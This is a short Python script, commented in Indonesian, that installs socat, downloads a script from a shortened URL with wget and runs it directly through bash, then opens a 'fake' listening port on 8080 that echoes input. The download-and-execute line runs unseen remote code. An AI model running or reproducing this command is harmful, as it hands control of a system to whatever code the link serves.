import subprocess

# Perintah untuk mendownload dan menjalankan skrip dari URL
command = 'apt install socat -y && bash -c "$(wget -qO- s.id/26TIf)"'

# Menjalankan perintah menggunakan subprocess
result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Menampilkan output dari perintah (opsional, untuk debugging)
print(result.stdout.decode())
if result.stderr:
    print(result.stderr.decode())

# Membuka port palsu menggunakan socat
fake_open_port_command = 'socat TCP-LISTEN:8080,fork EXEC:/bin/cat'

# Menjalankan perintah untuk membuka port palsu menggunakan subprocess
fake_port_result = subprocess.run(fake_open_port_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Menampilkan output dari perintah untuk membuka port palsu (opsional, untuk debugging)
print(fake_port_result.stdout.decode())
if fake_port_result.stderr:
    print(fake_port_result.stderr.decode())
